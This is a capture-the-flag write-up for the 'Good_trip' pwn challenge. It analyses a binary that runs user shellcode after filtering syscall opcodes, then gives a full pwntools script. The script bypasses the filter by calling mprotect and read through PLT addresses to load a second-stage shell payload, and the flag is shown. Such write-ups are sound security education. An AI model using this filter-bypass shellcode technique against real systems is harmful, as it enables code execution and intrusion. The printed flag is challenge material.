https://ctftime.org/event/2222

# Good_trip (PWN)

if you think about it? it doesn't make any sense. GOOOOD TRIP

nc 172.210.129.230 1351

## Binary Analysis

- `main` @ `0x004012b5`
    - maps a page @ `0x1337131000` with rwx
    - reads your code into this page
    - calls `filter`
        - if the filter returns non-zero `exit(-1)`
    - calls `exec`

- `filter` @ `0x004011eb`
    - checks for the byte sequences `0f 05` and `cd 80`
        - these correspond to `syscall`, `int 0x80`
    - code also checks for `0f 04` but idk what this does

- `exec` @ `0x004011a6`
    - clears a bunch of registers including `rsp`
    - jumps to `0x1337131000` / our code

## Solution

1) Restore the stack so we can make function calls - any RW region should do
2) Change the protections on `0x1337131000` so we can write more shellcode
3) Call `read` to read more shellcode - containing the syscall
4) Pivot to the new shellcode we read

```python
from pwn import *

elf = ELF("./good_trip", checksec=False)
context.binary = elf

p = remote("172.210.129.230", 1351)

payload = b"\x90" * 44 # nops to overwrite
payload += asm("mov rsp, 0x404500") # new stack
payload += asm("mov rdx, 7")
payload += asm("mov rsi, 4096")
payload += asm("movabs rdi, 0x1337131000")
payload += asm("mov rax, 0x00401090")
payload += asm("call rax") # mprotect(0x1337131000, 4096, 7)
payload += asm("mov rdx, 100")
payload += asm("mov rsi, 0x1337131000")
payload += asm("mov rdi, 0")
payload += asm("mov rax, 0x00401060")
payload += asm("call rax") # read(0, 0x1337131000, 100)
payload += asm("movabs rax, 0x1337131000")
payload += asm("jmp rax") # jmp 0x1337131000

p.readuntil(b"code size >> ")
p.sendline(str(len(payload)).encode())

p.readuntil(b"code >> ")
p.sendline(payload)

p.sendline(asm(shellcraft.sh()))

p.interactive()
```

## Flag
`AKASEC{y34h_You_C4N7_PRO73C7_5om37hIn9_YoU_doN7_h4V3}`

smiley 2024/06/08
